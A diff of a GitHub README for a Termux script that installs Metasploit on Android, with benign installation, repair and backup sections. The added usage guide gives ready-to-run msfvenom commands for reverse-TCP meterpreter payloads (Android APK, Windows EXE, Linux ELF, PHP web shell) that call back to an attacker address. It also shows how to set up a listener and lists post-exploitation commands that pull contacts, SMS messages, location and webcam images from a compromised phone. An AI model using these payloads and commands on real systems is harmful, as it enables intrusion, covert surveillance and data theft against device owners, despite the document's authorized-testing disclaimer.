@@ -1,133 +1,393 @@
 
 # Metasploit-Framework Installer for Termux
 
-
-
 <p align="center">
   <img src="https://user-images.githubusercontent.com/46929618/154997514-8bd1d6c6-6b3d-4251-a6ce-6b8bceb22b06.png" width="100%" alt="Banner">
 </p>
+
 <p align="center">
 <img title="Version" src="https://img.shields.io/badge/Version-3.0.0-green.svg?style=flat-square">
-<img title="Maintainence" src="https://img.shields.io/badge/Maintained%3F-yes-green.svg?style=flat-square">
+<img title="Maintained" src="https://img.shields.io/badge/Maintained%3F-yes-green.svg?style=flat-square">
 <img title="Proot" src="https://img.shields.io/badge/Method-Proot--Distro-blue.svg?style=flat-square">
+<img title="Ruby" src="https://img.shields.io/badge/Ruby-3.4.x%20Compatible-red.svg?style=flat-square">
 <img title="License" src="https://img.shields.io/badge/License-GNU-blue.svg?style=flat-square">
 </p>
+
 <p align="center">
 <a href="https://github.com/h4ck3r0"><img title="Github" src="https://img.shields.io/badge/H4CK3R-RAJ-brightgreen?style=for-the-badge&logo=github"></a>
 <a href="https://youtube.com/c/H4Ck3R0"><img title="YouTube" src="https://img.shields.io/badge/YouTube-H4CK3R-red?style=for-the-badge&logo=Youtube"></a>
+<a href="https://h4ck3r.me"><img title="Website" src="https://img.shields.io/badge/Website-h4ck3r.me-yellow?style=for-the-badge&logo=blogger"></a>
 </p>
 
 ---
 
-### 🛡️ ABOUT THE TOOL
-Since Metasploit was removed from the official Termux repositories, installing it has become difficult due to **Ruby gem compilation errors** (Nokogiri/Gumbo). This script now supports three installation methods, including the **recommended proot-distro approach** which completely bypasses all gem errors.
+## 🛡️ About
+
+Since Metasploit was removed from the official Termux repositories, installing it became difficult due to **Ruby gem compilation errors** (Nokogiri/Gumbo, bundler conflicts, Ruby version mismatches). This script provides **three installation methods** — including the new recommended **proot-distro approach** which completely bypasses all gem errors using Rapid7's official pre-built package.
 
 ---
 
-### ✅ INSTALLATION METHODS
+## 📊 Installation Methods
 
-| Method | Android | Stability | Size | Recommended |
-|--------|---------|-----------|------|-------------|
-| **Proot-Distro (Debian)** | 7.0+ | ⭐⭐⭐⭐⭐ | ~300MB | ✅ YES |
-| Direct Install (Modern) | 7.0+ | ⭐⭐⭐ | ~150MB | ⚠️ May have gem errors |
-| Legacy Install | 4.4-6.0 | ⭐⭐ | ~150MB | ❌ Old MSF version |
+| Method | Android | Stability | Disk | Recommended |
+|--------|---------|-----------|------|:-----------:|
+| 🏆 **Proot-Distro (Debian)** | 7.0+ | ⭐⭐⭐⭐⭐ | ~300MB | ✅ **YES** |
+| ⚙️ Direct Install (Modern) | 7.0+ | ⭐⭐⭐ | ~150MB | ⚠️ May have gem errors |
+| 🕹️ Legacy Install | 4.4–6.0 | ⭐⭐ | ~150MB | For old devices only |
 
----
-
-### 🚀 FEATURES (Proot Method)
-* **[+]** Zero Ruby gem compilation — uses Rapid7 official pre-built package.
-* **[+]** Lightweight Debian (~300MB) — not heavy Kali Linux.
-* **[+]** `/sdcard` auto-mounted — save payloads directly to phone storage.
-* **[+]** PostgreSQL auto-configured inside Debian.
-* **[+]** Three launchers: `msfconsole`, `msfvenom`, `msf-shell`.
-* **[+]** Update MSF anytime with `apt upgrade` inside Debian.
+> **Why Proot?** Debian proot uses Rapid7's official omnibus package — a pre-compiled binary with its own embedded Ruby. No gem compilation, no Nokogiri errors, no bundler issues. Ever.
 
 ---
 
-### 🛠️ REQUIREMENTS
-* Termux (Latest version from F-Droid)
-* Minimum 2GB Internal Storage
-* Stable Internet Connection
-* Android 7.0+ (for proot method)
+## 🛠️ Requirements
+
+- **Termux** latest version from [F-Droid](https://f-droid.org/packages/com.termux/) *(NOT Play Store)*
+- Minimum **2GB** free internal storage (3GB+ recommended for proot)
+- Stable internet connection
+- Android **7.0+** for proot method / Android **4.4+** for legacy
 
 ---
 
-### 📥 INSTALLATION
+## 📥 Installation
 
 ```bash
-# Update and upgrade system
+# 1. Update Termux
 apt update && apt upgrade -y
 
-# Install git
+# 2. Install git
 apt install git -y
 
-# Clone the repository
+# 3. Clone this repository
 git clone https://github.com/h4ck3r0/Metasploit-termux
 
-# Enter directory
+# 4. Enter directory
 cd Metasploit-termux
 
-# Grant execution permission
+# 5. Grant permissions
 chmod +x *
 
-# Run the installer
+# 6. Run installer
 bash metasploit.sh
 ```
 
-> **Choose Option 3 → Proot-Distro (Recommended)**
+### Menu Options
+
+```
+[1] Metasploit Installation
+    ├── [1] Legacy (Android 4.4 - 6.0)
+    ├── [2] Modern Direct (Android 7.0+)
+    └── [3] Proot-Distro / Debian  ← RECOMMENDED
+[2] Repair
+[3] Backup
+[4] Restore
+[5] Update
+[6] Exit
+```
+
+> 💡 **Select Option 1 → then Option 3** for the most stable installation.
 
 ---
 
-### 🎮 USAGE
+## 🎮 Usage Guide
+
+### Launching Metasploit Console
 
 ```bash
-# Launch Metasploit console
+msfconsole
+```
+
+This automatically:
+- Starts PostgreSQL database
+- Enters the Debian environment (proot method)
+- Launches `msfconsole`
+
+---
+
+### Basic msfconsole Commands
+
+```bash
+# Show help
+help
+
+# Search for a module
+search type:exploit name:eternalblue
+search type:auxiliary name:scanner
+
+# Use a module
+use exploit/multi/handler
+use auxiliary/scanner/portscan/tcp
+
+# Show module info
+info
+
+# Show required options
+show options
+
+# Set options
+set LHOST 192.168.1.100
+set LPORT 4444
+set PAYLOAD android/meterpreter/reverse_tcp
+
+# Run the module
+run
+exploit
+
+# List active sessions
+sessions -l
+
+# Interact with a session
+sessions -i 1
+
+# Background current session
+background
+
+# Exit msfconsole
+exit
+```
+
+---
+
+### Generating Payloads with msfvenom
+
+```bash
+# Basic syntax
+msfvenom -p <PAYLOAD> LHOST=<YOUR_IP> LPORT=<PORT> -o <OUTPUT_FILE>
+```
+
+#### Android APK Payload
+```bash
+# Reverse TCP (most common)
+msfvenom -p android/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 \
+  LPORT=4444 \
+  -o /sdcard/MSF/payloads/payload.apk
+```
+
+#### Windows Executable
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 \
+  LPORT=4444 \
+  -f exe \
+  -o /sdcard/MSF/payloads/payload.exe
+```
+
+#### Linux ELF Binary
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 \
+  LPORT=4444 \
+  -f elf \
+  -o /sdcard/MSF/payloads/payload.elf
+```
+
+#### PHP Web Shell
+```bash
+msfvenom -p php/meterpreter/reverse_tcp \
+  LHOST=192.168.1.100 \
+  LPORT=4444 \
+  -f raw \
+  -o /sdcard/MSF/payloads/shell.php
+```
+
+#### List all available payloads
+```bash
+msfvenom -l payloads
+msfvenom -l payloads | grep android
+msfvenom -l payloads | grep windows
+```
+
+---
+
+### Setting Up a Listener
+
+After generating a payload, set up a listener to catch the connection:
+
+```bash
 msfconsole
 
-# Generate payloads (saves to /sdcard/MSF/payloads/ by default)
-msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 \
-  -o /sdcard/MSF/payloads/payload.apk
-
-# Enter Debian shell (to build tools, copy files, etc.)
-msf-shell
+# Inside msfconsole:
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST 0.0.0.0        # listen on all interfaces
+set LPORT 4444
+set ExitOnSession false   # keep listening after first connection
+run -j                    # run as background job
 ```
 
 ---
 
-### 📁 FILE ACCESS & STORAGE
+### Meterpreter Commands (Post-Exploitation)
 
-Files built inside the Debian proot can be copied to your phone storage easily:
+Once a session is open:
 
 ```bash
-# From inside Debian (msf-shell), /sdcard is mounted:
-cp /root/mytool.apk /sdcard/MSF/mytool.apk
+# System info
+sysinfo
+getuid
 
-# Access from Android: Internal Storage → MSF → payloads/
+# File system
+ls
+pwd
+cd /sdcard
+download /sdcard/contacts.db /sdcard/MSF/loot/
+
+# Upload a file
+upload /sdcard/MSF/payloads/tool /tmp/tool
+
+# Take a screenshot
+screenshot
+
+# Get location (Android)
+geolocate
+
+# Dump SMS messages (Android)
+dump_sms
+
+# Camera
+webcam_list
+webcam_snap
+
+# Shell access
+shell
+
+# Background session and return to msf
+background
 ```
 
-**Auto-mounted paths inside Debian:**
-| Debian Path | Points To |
-|-------------|-----------|
-| `/sdcard/` | Phone internal storage |
-| `/sdcard/MSF/payloads/` | Payload output folder |
-| `/sdcard/MSF/loot/` | Loot/data folder |
-| `/root/msf-output/` | Alias for `/sdcard/MSF/` |
+---
+
+## 📁 Storage & File Access Guide
+
+> **All paths below work inside the Debian proot environment.**
+
+| Inside Debian | Maps to | Access from Android |
+|---------------|---------|---------------------|
+| `/sdcard/` | Phone internal storage | File Manager root |
+| `/sdcard/MSF/payloads/` | Payload output folder | Internal Storage → MSF → payloads |
+| `/sdcard/MSF/loot/` | Loot/captured data | Internal Storage → MSF → loot |
+| `/sdcard/MSF/backups/` | Backup storage | Internal Storage → MSF → backups |
+| `/root/msf-output/` | Alias for `/sdcard/MSF/` | Same as above |
+
+### Entering the Debian shell
+
+```bash
+# Drop into a full Debian shell
+msf-shell
+
+# Inside Debian — build a tool, then copy to phone:
+gcc exploit.c -o exploit
+cp exploit /sdcard/MSF/exploit
+
+# Exit back to Termux
+exit
+```
+
+### Copy files between Debian and phone
+
+```bash
+# From inside Debian (msf-shell):
+cp /root/myfile.apk /sdcard/MSF/myfile.apk
+
+# From Termux (outside proot):
+cp ~/proot-distro/installed-rootfs/debian/root/myfile /sdcard/MSF/
+```
 
 ---
 
-### 📢 IMPORTANT NOTICE
+## 🔧 Repair
 
-Metasploit is resource-intensive. If the process is killed by Android:
-- Disable **Battery Optimization** for Termux in Android settings
-- Enable **Phantom Process Killer** workaround for Android 12+:
-  ```bash
-  adb shell device_config set_sync_disabled_for_tests persistent
-  adb shell device_config put activity_manager max_phantom_processes 2147483647
-  ```
+If Metasploit breaks after a Termux update:
+
+```bash
+bash metasploit.sh
+# Choose Option 2 → Repair
+```
+
+The repair script will:
+- Reinstall all dependencies
+- Fix Nokogiri gem (Gumbo disabled)
+- Reinstall bundle gems
+- Fix PostgreSQL PID issues
 
 ---
 
-### 🌐 CONNECT WITH US
+## 💾 Backup & Restore
+
+### Creating a Backup
+
+```bash
+bash metasploit.sh
+# Choose Option 3 → Backup
+```
+
+Backup is saved to: **Internal Storage → MSF → backups/**  
+You can view it from any Android file manager.
+
+### Restoring a Backup
+
+```bash
+bash metasploit.sh
+# Choose Option 4 → Restore
+# Select backup from the numbered list
+```
+
+---
+
+## 🔄 Update
+
+```bash
+bash metasploit.sh
+# Choose Option 5 → Update
+```
+
+Or manually update MSF inside Debian (proot method):
+
+```bash
+msf-shell
+apt update && apt upgrade metasploit-framework -y
+exit
+```
+
+---
+
+## ⚡ Android 12+ Fix (Phantom Process Killer)
+
+Android 12+ aggressively kills background processes. To disable this:
+
+```bash
+# Requires ADB from a PC:
+adb shell device_config set_sync_disabled_for_tests persistent
+adb shell device_config put activity_manager max_phantom_processes 2147483647
+```
+
+Also: Go to **Android Settings → Apps → Termux → Battery → Unrestricted**
+
+---
+
+## ❓ Troubleshooting
+
+| Problem | Fix |
+|---------|-----|
+| `msfconsole: command not found` | Re-run installer or check `ls $PREFIX/bin/msfconsole` |
+| `Could not start server` (PostgreSQL) | `rm ~/proot-distro/installed-rootfs/debian/var/run/postgresql/.s.*` then retry |
+| `Gem::LoadError` on startup | Run Repair from main menu |
+| `bundle install` fails | Use proot method — bypasses all gem issues |
+| Process killed by Android | Disable battery optimization for Termux |
+| `/sdcard` not accessible | Run `termux-setup-storage` in Termux |
+| `proot-distro: command not found` | `pkg install proot-distro` |
+
+---
+
+## 📢 Legal Disclaimer
+
+> This tool is for **educational and authorized penetration testing purposes only**.  
+> Unauthorized access to systems is **illegal**. The author is not responsible for misuse.  
+> Always get **written permission** before testing any system you do not own.
+
+---
+
+## 🌐 Connect
 
 <p align="left">
   <a href="https://www.h4ck3r.me">
@@ -141,8 +401,10 @@ Metasploit is resource-intensive. If the process is killed by Android:
   </a>
 </p>
 
-<a href="https://www.buymeacoffee.com/h4ck3r" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 50px !important;width: 180px !important;" ></a>
+<a href="https://www.buymeacoffee.com/h4ck3r" target="_blank">
+  <img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 50px !important;width: 180px !important;">
+</a>
 
 ---
 
-**Developed by Raj Aryan (h4ck3r0)** *Give a ⭐ if this script helped you!*
+**Developed by Raj Aryan (h4ck3r0)** — *Give a ⭐ if this helped you!*
